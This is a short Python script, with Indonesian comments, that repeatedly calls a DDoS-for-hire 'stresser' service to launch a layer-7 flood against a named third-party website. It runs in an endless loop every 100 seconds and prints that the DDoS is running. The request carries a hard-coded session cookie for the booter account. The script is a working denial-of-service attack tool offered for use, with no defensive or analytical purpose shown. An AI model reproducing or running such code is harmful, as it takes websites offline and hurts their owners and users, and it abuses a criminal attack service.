import requests
import time

url = "https://redstresser.org/complexx/layer7.php?type=start&host=https://cbtsman64jkt.my.id/&port=443&time=100&method=TLS-DETECT&totalservers=1&vip=undefined"
headers = {
    "Cookie": "PHPSESSID=q1igdhs5fmas0n717koqmrmdc3; _ga=GA1.1.560406229.1717700716; _ga_CQ0717FTC6=GS1.1.1717700715.1.1.1717700747.0.0.0; twk_idm_key=HKXh78Pk3NuS_bSS5dT5u; TawkConnectionTime=0; twk_uuid_60d20e8865b7290ac6375211=%7B%22uuid%22%3A%221.WrwLMEWeYMyuMAJauPFiY0GlJOW8UGFd7kExrRSqiHvJIxJ4zqdi8srHd8RYGQE8DGVr6GypGNtx4DEPTnxGUPVlvugNqCLdwlmMQ2qjBywks4tjSHdAnERD2%22%2C%22version%22%3A3%2C%22domain%22%3A%22redstresser.org%22%2C%22ts%22%3A1717701257400%7D",
    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://redstresser.org/hub",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=1, i"
}

while True:
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print("DDOS Sudah Berjalan...")
    else:
        print(f"Error: {response.status_code}")
    time.sleep(100)  # Delay 100 detik sebelum request berikutnya
